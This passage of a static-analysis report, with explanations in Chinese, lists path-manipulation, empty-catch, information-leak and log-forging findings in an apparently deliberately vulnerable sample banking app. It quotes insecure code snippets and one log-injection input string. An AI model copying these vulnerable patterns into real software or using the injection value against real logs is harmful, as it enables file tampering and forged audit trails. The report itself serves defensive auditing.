                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/UploadProfilePicture.java</FilePath>
                                <LineStart>55</LineStart>
                                <Snippet>
            try {
                File theFile = new File(new_filename);
                FileUtils.copyFile(file, theFile);
            } catch (Exception e) {</Snippet>
                                <TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>UploadProfilePicture.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/UploadProfilePicture.java</FilePath>
                                <LineStart>34</LineStart>
                                <Snippet>    }

    public void setUploadFileName(String filename) {
        this.filename = filename;
    }</Snippet>
                                <TargetFunction>setUploadFileName(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="23F9CE587987F540BCCF37CEED4858BE" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>攻击者可以控制 ConnectionFactory.java 中第 28 行的 FileInputStream() 文件系统路径参数，借此访问或修改其他受保护的文件。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>28</LineStart>
                                <Snippet>            {
                java.util.Properties props = new java.util.Properties();
                props.load( new java.io.FileInputStream(pFile) );
            }
        }</Snippet>
                                <TargetFunction>java.io.FileInputStream.FileInputStream()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>24</LineStart>
                                <Snippet>		try
		{
            String pFile = System.getProperty("ConnectionFactory.pfile");
            if (pFile != null)
            {</Snippet>
                                <TargetFunction>java.lang.System.getProperty()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="277A9F0ECBEE7F8B8238C19E9F7859F7" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>攻击者可以控制 UploadProfilePicture.java 中第 47 行的 File() 文件系统路径参数，借此访问或修改其他受保护的文件。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>UploadProfilePicture.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/UploadProfilePicture.java</FilePath>
                                <LineStart>47</LineStart>
                                <Snippet>
        String directory = home + dir_separator+ "webapps"+dir_separator+ "riches"+dir_separator+"profilepictures";
        File dir=new File(directory);
        dir.exists();
        new_filename =directory+dir_separator+filename;</Snippet>
                                <TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>UploadProfilePicture.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/UploadProfilePicture.java</FilePath>
                                <LineStart>43</LineStart>
                                <Snippet>        super.execute();

        String home=System.getProperty("catalina.home");
        String dir_separator=System.getProperty("file.separator");
</Snippet>
                                <TargetFunction>java.lang.System.getProperty()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BF47974CD8FE41843E26F7865DB94673" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>攻击者可以控制 UploadProfilePicture.java 中第 47 行的 File() 文件系统路径参数，借此访问或修改其他受保护的文件。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>UploadProfilePicture.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/UploadProfilePicture.java</FilePath>
                                <LineStart>47</LineStart>
                                <Snippet>
        String directory = home + dir_separator+ "webapps"+dir_separator+ "riches"+dir_separator+"profilepictures";
        File dir=new File(directory);
        dir.exists();
        new_filename =directory+dir_separator+filename;</Snippet>
                                <TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>UploadProfilePicture.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/UploadProfilePicture.java</FilePath>
                                <LineStart>44</LineStart>
                                <Snippet>
        String home=System.getProperty("catalina.home");
        String dir_separator=System.getProperty("file.separator");

        String directory = home + dir_separator+ "webapps"+dir_separator+ "riches"+dir_separator+"profilepictures";</Snippet>
                                <TargetFunction>java.lang.System.getProperty()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7B071C48A5A67BAD2F0DE3FA28C4ED6E" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>攻击者可以控制 ConnFactory.java 中第 20 行的 FileInputStream() 文件系统路径参数，借此访问或修改其他受保护的文件。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>20</LineStart>
                                <Snippet>            {
                java.util.Properties props = new java.util.Properties();
                props.load( new java.io.FileInputStream(pFile) );
            }
            Context ctx = new InitialContext();</Snippet>
                                <TargetFunction>java.io.FileInputStream.FileInputStream()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>16</LineStart>
                                <Snippet>        try
        {
            String pFile = System.getProperty("ConnFactory.pfile");
            if (pFile != null)
            {</Snippet>
                                <TargetFunction>java.lang.System.getProperty()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>Poor Error Handling: Empty Catch Block</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>ConnectionFactory.java 中的 ConnectionFactory() 方法忽略了第 31 行上的一个异常，这可能会导致程序无法发现意外状况和情况。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>几乎每一个对软件系统的严重攻击都是从违反程序员的假设开始的。攻击后，程序员的假设看起来既脆弱又拙劣，但攻击前，许多程序员会在午休时间为自己的种种假设做很好的辩护。

在代码中，很容易发现两个令人怀疑的假设：“一是这个方法调用不可能出错；二是即使出错了，也不会对系统造成什么重要影响。”因此当程序员忽略异常时，这其实就表明了他们是基于上述假设进行的操作。

例 1：下面摘录的代码会忽略一个由 doExchange() 抛出的罕见异常。


try {
  doExchange();
}
catch (RareException e) {
  // this can never happen
}


如果抛出 RareException 异常，程序会继续执行，就像什么都没有发生一样。程序不会记录任何有关这一特殊情况的依据，因而事后再查找这一异常就可能很困难。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>至少，应该记录抛出异常的事实，以便于稍后查询及预知对程序运行所造成的影响。然而最好是中止当前操作。如果忽略某个异常的原因是因为调用者无法正确处理该异常，而程序上下文使调用者不便或不可能声明程序会抛出这一异常，那么可以考虑抛出 RuntimeException 或 Error 异常，两者均是未检查的异常。在 JDK 1.4 中，RuntimeException 有一个构造函数，可以方便地用来封装另其他异常。

示例 2：Example 1 中的代码可通过以下方式重写：


try {
  doExchange();
}
catch (RareException e) {
  throw new RuntimeException("This can never happen", e);
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 只有极少的异常类型可以在特定的上下文中丢弃。例如，Thread.sleep() 会抛出 InterruptedException 异常，并且在大多数情况下，程序应该以相同的方式决定线程是否唤醒过早。


  try {
    Thread.sleep(1000);
  }
  catch (InterruptedException e){
    // The thread has been woken up prematurely, but its
    // behavior should be the same either way.
  }
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>9</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="ABF9546DF83AE597ED8A526B79370EFD" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ConnectionFactory.java 中的 ConnectionFactory() 方法忽略了第 31 行上的一个异常，这可能会导致程序无法发现意外状况和情况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>31</LineStart>
                                <Snippet>            }
        }
        catch (Exception e)
        {
			// TODO: fill in this code</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C229EECF8D63827B278DC757A6697DE8" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LocationService.java 中的 findAtmByZip() 方法忽略了第 72 行上的一个异常，这可能会导致程序无法发现意外状况和情况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>LocationService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/LocationService.java</FilePath>
                                <LineStart>72</LineStart>
                                <Snippet>            locations = query.list();
        }
        catch (Exception e){}
        finally{
            if(session!=null)</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="71EAFA2683B8869FB0549EDBE503AF70" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>MessageService.java 中的 addMessage() 方法忽略了第 27 行上的一个异常，这可能会导致程序无法发现意外状况和情况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>MessageService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/MessageService.java</FilePath>
                                <LineStart>27</LineStart>
                                <Snippet>            session.close();
        }
        catch(Exception e)
        {
            // Treat all exceptions the same here</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="544E616D7AFFCFB81DED685CCC141593" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AdminUtil.java 中的 isAuth() 方法忽略了第 134 行上的一个异常，这可能会导致程序无法发现意外状况和情况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminUtil.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/AdminUtil.java</FilePath>
                                <LineStart>134</LineStart>
                                <Snippet>                    authType = Integer.parseInt(cookies[i].getValue());
		}
		catch(NumberFormatException e) {
		    // swallow exception for empty or bad authType value
		}</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4F6D1969D287FCFDD2312B7D4DBFB91E" ruleID="8843F319-8A22-4101-A378-C2B2F2597988">
                            <Category>Poor Error Handling: Empty Catch Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AccountService.java 中的 changePassword() 方法忽略了第 256 行上的一个异常，这可能会导致程序无法发现意外状况和情况。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>256</LineStart>
                                <Snippet>		        MessageDigest md = MessageDigest.getInstance("SHA-2");
	        }
	        catch (Exception e){
	        }
</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="9">
                        <groupTitle>System Information Leak</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>ConnFactory.java 中的 ConnFactory() 函数可能通过调用第 37 行的 printStackTrace() 来揭示系统数据或调试信息。由 printStackTrace() 揭示的信息有助于攻击者制定攻击计划。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>当系统数据或调试信息通过输出流或者日志功能流出程序时，就会发生信息泄漏。



示例 1：以下代码会将一个异常写入标准错误流：


try {
    ...
} catch (Exception e) {
    e.printStackTrace();
}


依据这一系统配置，该信息可转储到控制台，写成日志文件，或者显示给远程用户。例如，凭借脚本机制，可以轻松将输出信息从"标准错误"或"标准输出"重定向至文件或其他程序。或者，运行程序的系统可能具有将日志发送至远程设备的远程日志记录系统，例如 "syslog" 服务器。在开发过程中，您将无法知道此信息最终可能显示的位置。

在某些情况下，该错误消息恰好可以告诉攻击者入侵这一系统的可能性究竟有多大。例如，一则数据库错误消息可以揭示应用程序容易受到 SQL Injection 攻击。其他的错误消息可以揭示有关该系统的更多间接线索。在Example 1 中，泄露的信息可能会暗示有关操作系统类型、系统上安装了哪些应用程序以及管理员在配置程序时采取了哪些保护措施的信息。

这是另一种情况，特定于移动世界。大多数移动设备现在执行的是“近场通信”(NFC) 协议，以便使用无线电通信在设备之间快速共享信息。它在设备极为贴近或互相接触时有效。即使 NFC 的通信范围仅局限于几厘米，也可能发生窃听、修改数据以及各种其他类型的攻击情况，因为 NFC 本身并不能确保通信安全。

示例 2：Android 平台提供对 NFC 的支持。以下代码将创建一条消息，该消息会被发送给所在范围内的其他设备。

...
public static final String TAG = "NfcActivity";
private static final String DATA_SPLITTER = "__:DATA:__";
private static final String MIME_TYPE = "application/my.applications.mimetype";
...
public NdefMessage createNdefMessage(NfcEvent event) {
    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);
    String VERSION = tm.getDeviceSoftwareVersion();
    String text = TAG + DATA_SPLITTER + VERSION;
    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,
            MIME_TYPE.getBytes(), new byte[0], text.getBytes());
    NdefRecord[] records = { record };
    NdefMessage msg = new NdefMessage(records);
    return msg;
}
...


NFC 数据交换格式 (NDEF) 消息包含类型化数据、URI 或自定义应用程序有效负载。如果该消息包含与应用程序有关的信息（如其名称、MIME 类型或设备软件版本），则此信息可能会泄露给窃听者。在Example 2 中，Fortify Static Code Analyzer（Fortify 静态代码分析器）会在返回语句中报告 System Information Leak 漏洞。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>编写错误消息时，始终要牢记安全性。在编码的过程中，尽量避免使用繁复的消息，提倡使用简短的错误消息。限制生成与存储繁复的输出数据将有助于管理员和程序员诊断问题的所在。此外，还要留意有关调试的跟踪信息，有时它可能出现在不明显的位置（例如嵌入在错误页 HTML 代码的注释行中）。

即便是并未揭示栈踪迹或数据库转储的简短错误消息，也有可能帮助攻击者发起攻击。例如，“Access Denied”（拒绝访问）消息可以揭示系统中存在一个文件或用户。

如果您担心 Android 设备上的系统数据会通过 NFC 泄露，那么您可以采取以下三种措施之一。不把系统数据包括在发送到范围内其他设备的消息中，或加密消息负载，或在更高层中建立安全通信通道。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 不要依赖于封装器脚本、组织内部的 IT 策略或是思维敏捷的系统管理员来避免 System Information Leak 漏洞。编写安全的软件才是关键。

2. 这类漏洞并不适用于所有类型的程序。例如，如果您在一个客户机上执行应用程序，而攻击者已经获取了该客户机上的系统信息，或者如果您仅把系统信息打印到一个可信赖的日志文件中，就可以使用 AuditGuide 来过滤这一类别。

3. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>9</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A1A027DE5A316C0051DC43E45EBF7D53" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ConnFactory.java 中的 ConnFactory() 函数可能通过调用第 37 行的 printStackTrace() 来揭示系统数据或调试信息。由 printStackTrace() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>37</LineStart>
                                <Snippet>        catch (Exception e)
        {
            e.printStackTrace();
        }
    }</Snippet>
                                <TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="32B4D6A63D261CF37EAA6E0F790F9FDF" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>TransactionService.java 中的 addTransaction() 函数可能通过调用第 130 行的 printStackTrace() 来揭示系统数据或调试信息。由 printStackTrace() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>130</LineStart>
                                <Snippet>        catch(Exception e)
        {
            e.printStackTrace();
        }
        finally{</Snippet>
                                <TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="554E03C416E18686A6640840477BC725" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SendMessage.java 中的 sendMail() 函数可能通过调用第 94 行的 printStackTrace() 来揭示系统数据或调试信息。由 printStackTrace() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>SendMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendMessage.java</FilePath>
                                <LineStart>94</LineStart>
                                <Snippet>        catch(Exception e)
        {
            e.printStackTrace();
            System.out.println(e.getMessage());
            System.out.println(e.getLocalizedMessage());</Snippet>
                                <TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D2783906CB9E709A16D415E9FCBACB36" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ConnFactory.java 中的 getConnection() 函数可能通过调用第 76 行的 printStackTrace() 来揭示系统数据或调试信息。由 printStackTrace() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>76</LineStart>
                                <Snippet>        catch (Exception e)
        {
            e.printStackTrace();
        }
</Snippet>
                                <TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A7257D3AE874E899ABC7585DF8D73D24" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SendMail.java 中的 &lt;static&gt;() 函数可能通过调用第 32 行的 printStackTrace() 来揭示系统数据或调试信息。由 printStackTrace() 揭示的信息有助于攻击者制定攻击计划。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>SendMail.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/legacy/mail/SendMail.java</FilePath>
                                <LineStart>32</LineStart>
                                <Snippet>		}
		catch (IOException e) {
		 e.printStackTrace();
		}
	}</Snippet>
                                <TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Log Forging</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>TransactionService.java 文件中的方法 getTransactions() 将未验证的用户输入写入第 42 行的日志。攻击者可以利用这一行为来伪造日志条目或将恶意内容注入日志。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>在以下情况下会发生 Log Forging 的漏洞：

1. 数据从一个不可信赖的数据源进入应用程序。

2. 数据写入到应用程序或系统日志文件中。

为了便于以后的审阅、统计数据收集或调试，应用程序通常使用日志文件来储存事件或事务的历史记录。根据应用程序自身的特性，审阅日志文件可在必要时手动执行，也可以自动执行，即利用工具自动挑选日志中的重要事件或带有某种倾向性的信息。

如果攻击者可以向随后会被逐字记录到日志文件的应用程序提供数据，则可能会妨碍或误导日志文件的解读。最理想的情况是，攻击者可能通过向应用程序提供包括适当字符的输入，在日志文件中插入错误的条目。如果日志文件是自动处理的，那么攻击者就可以通过破坏文件格式或注入意外的字符，从而使文件无法使用。更阴险的攻击可能会导致日志文件中的统计信息发生偏差。通过伪造或其他方式，受到破坏的日志文件可用于掩护攻击者的跟踪轨迹，甚至还可以牵连第三方来执行恶意行为 [1]。最糟糕的情况是，攻击者可能向日志文件注入代码或者其他命令，利用日志处理实用程序中的漏洞 [2]。

例 1： 下列 Web 应用程序代码会尝试从一个请求对象中读取整数值。如果数值未被解析为整数，输入就会被记录到日志中，附带一条提示相关情况的错误消息。


...
	String val = request.getParameter("val");
	try {
  		int value = Integer.parseInt(val);
	}
	catch (NumberFormatException nfe) {
  		log.info("Failed to parse val = " + val);
	}
...


如果用户为“val”提交字符串“twenty-one”，则日志中会记录以下条目：


INFO: Failed to parse val=twenty-one


然而，如果攻击者提交字符串“twenty-one%0a%0aINFO:+User+logged+out%3dbadguy”，则日志中会记录以下条目：


INFO: Failed to parse val=twenty-one

INFO: User logged out=badguy


显然，攻击者可以使用同样的机制插入任意日志条目。

有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 Log Forging）是无意义的 -- 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。

示例 2：以下代码会调整Example 1 以适应 Android 平台。


...
	String val = this.getIntent().getExtras().getString("val");
	try {
		int value = Integer.parseInt();
	}
	catch (NumberFormatException nfe) {
		Log.e(TAG, "Failed to parse val = " + val);
        }
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>使用间接方法防止 Log Forging 攻击：创建一组与不同事件一一对应的合法日志条目，这些条目必须记录在日志中，并且仅记录该组条目。要捕获动态内容（如用户注销系统），请务必使用由服务器控制的数值，而非由用户提供的数据。这就确保了日志条目中绝不会直接使用由用户提供的输入。

可以按以下方式将例 1 重写为与 NumberFormatException 对应的预定义日志条目：


...
	public static final String NFE = "Failed to parse val. The input is required to be an integer value."
...
	String val = request.getParameter("val");
        try {
                int value = Integer.parseInt(val);
        }
        catch (NumberFormatException nfe) {
                log.info(NFE);
        }
..


下面是 Android 的等同内容：


...
	public static final String NFE = "Failed to parse val. The input is required to be an integer value."
...
        String val = this.getIntent().getExtras().getString("val");
        try {
                int value = Integer.parseInt();
        }
        catch (NumberFormatException nfe) {
                Log.e(TAG, NFE);
        }
...


在某些情况下，这个方法有些不切实际，因为这样一组合法的日志条目实在太大或是太复杂了。这种情况下，开发者往往又会退而采用黑名单方法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。然而，不安全字符列表很快就会不完善或过时。更好的方法是创建一份白名单，允许其中的字符出现在日志条目中，并且只接受完全由这些经认可的字符组成的输入。在大多数 Log Forging 攻击中，最关键的字符是“\n”（换行符），该字符决不能出现在日志条目白名单中。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 许多日志功能只是为了在开发和测试过程中调试程序而创建的。根据我们的经验，当生产的某一阶段，会随机或出于某一目的进行调试。不要仅仅因为程序员说“我没有计划在生产中启动调试功能”，就容忍 Log Forging 漏洞。

2. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>8</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="79D2C2C2E585492351AC3904E0092879" ruleID="7F1C8A57-3D6F-464E-883C-FC0028D5384F">
                            <Category>Log Forging</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TransactionService.java 文件中的方法 getTransactions() 将未验证的用户输入写入第 163 行的日志。攻击者可以利用这一行为来伪造日志条目或将恶意内容注入日志。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>163</LineStart>
                                <Snippet>            ServletContext servletContext = ServletActionContext.getServletContext();
            if(servletContext != null)
                servletContext.log(queryStr);
            Query query = session.createQuery(queryStr);
            SimpleDateFormat formatter = new SimpleDateFormat("MM-dd-yyyy");</Snippet>
                                <TargetFunction>javax.servlet.ServletContext.log()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>TransactionResources.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/restful/TransactionResources.java</FilePath>
                                <LineStart>105</LineStart>
                                <Snippet>                           @PathParam("date") String date,
                           @MatrixParam("payee") String payee,
                           @MatrixParam("amount") String amount,
                           @QueryParam("memo") String memo,
                           @QueryParam("id") String id){</Snippet>
                                <TargetFunction>GetTransactions(4)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8F7B9AF1F7E15177AD882B4812E76E66" ruleID="7F1C8A57-3D6F-464E-883C-FC0028D5384F">
                            <Category>Log Forging</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>TransactionService.java 文件中的方法 getTransactions() 将未验证的用户输入写入第 42 行的日志。攻击者可以利用这一行为来伪造日志条目或将恶意内容注入日志。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>TransactionService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/TransactionService.java</FilePath>
                                <LineStart>42</LineStart>
                                <Snippet>            ServletContext servletContext = ServletActionContext.getServletContext();
            if(servletContext != null)
                servletContext.log(queryStr);
            Query query = session.createQuery(queryStr);
            transactions = query.list();</Snippet>
                                <TargetFunction>javax.servlet.ServletContext.log()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountDetails.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/AccountDetails.java</FilePath>
                                <LineStart>61</LineStart>
                                <Snippet>    }

    public void setAcctno(String acctno) {
        this.acctno = acctno;
    }</Snippet>
                                <TargetFunction>setAcctno(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1B9A7F79ED5DF3AAB5A6DEC33C7392DE" ruleID="931F1329-2926-4EB6-8041-305A5067E86E">
                            <Category>Log Forging</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
